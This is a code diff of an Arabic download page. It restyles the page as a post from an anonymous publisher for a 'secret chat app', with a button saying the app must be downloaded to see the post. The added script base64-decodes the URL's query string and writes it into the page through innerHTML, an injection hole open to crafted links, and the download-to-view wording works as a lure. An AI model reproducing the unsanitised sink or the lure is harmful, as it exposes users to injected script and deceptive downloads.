@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Page</title>
+    <title>صفحة التحميل</title>
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
@@ -17,35 +17,61 @@
             justify-content: center; /* Center vertically */
             align-items: center; /* Center horizontally */
         }
-        .description {
-            margin-bottom: 20px; /* Space between description and button */
-            text-align: center;
+        .card {
+            background-color: #495057; /* Darker card background */
+            border: 1px solid #6c757d; /* Border for comment-like appearance */
+            border-radius: 10px; /* Rounded corners */
+            padding: 20px; /* Add padding */
+            text-align: center; /* Center text */
+            max-width: 500px; /* Max width for the card */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Subtle shadow */
+        }
+        .profile-pic {
+            width: 60px; /* Profile picture size */
+            height: 60px;
+            border-radius: 50%; /* Circular profile picture */
+            margin-bottom: 10px; /* Space below profile picture */
         }
         .btn-download {
             padding: 15px 30px; /* Larger button */
             font-size: 1.2rem; /* Larger text */
+            margin-top: 20px; /* Space above the button */
+            background-color: #28a745; /* Green background */
+            border: none; /* Remove button border */
+            border-radius: 5px; /* Rounded corners */
+        }
+        .btn-download:hover {
+            background-color: #218838; /* Darker green on hover */
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="description">
-        <h2>تحميل تطبيق عرب شات</h2>
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/9187/9187604.png" alt="Profile Picture" class="profile-pic">
+        <h5>الناشر: مجهول</h5>
+        <h2>تطبيق الدردشة السرية</h2>
+        <p>شاهد المنشور :</p>
+        <p class="card-text" id="pp"></p>
+        <a href="/index.html" class="btn btn-download">يجب تحميل التطبيق لمشاهدة المنشور</a>
     </div>
-    <a href="path/to/your/file.zip" class="btn btn-primary btn-download">تحميل التطبيق</a>
-    
-    <p id="pp"></p>
-
 </div>
+
 <script>
-
     const url = new URL(window.location.href);
-    let utf8Encode = new TextEncoder();
+    let utf8Decode = new TextDecoder();
     
-    document.getElementById("pp").innerHTML = utf8Encode.encode("هاي");
+    var data = url.toString().split("?")[1].substring(5); 
+    data = atob(data).split(',').map(Number);
 
+    const buffer = new ArrayBuffer(data.length);
+    const uint8Array = new Uint8Array(buffer);
+    uint8Array.set(data);
 
+    data = utf8Decode.decode(uint8Array);
+    
+    document.getElementById("pp").innerHTML = data;
 </script>
 
 <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
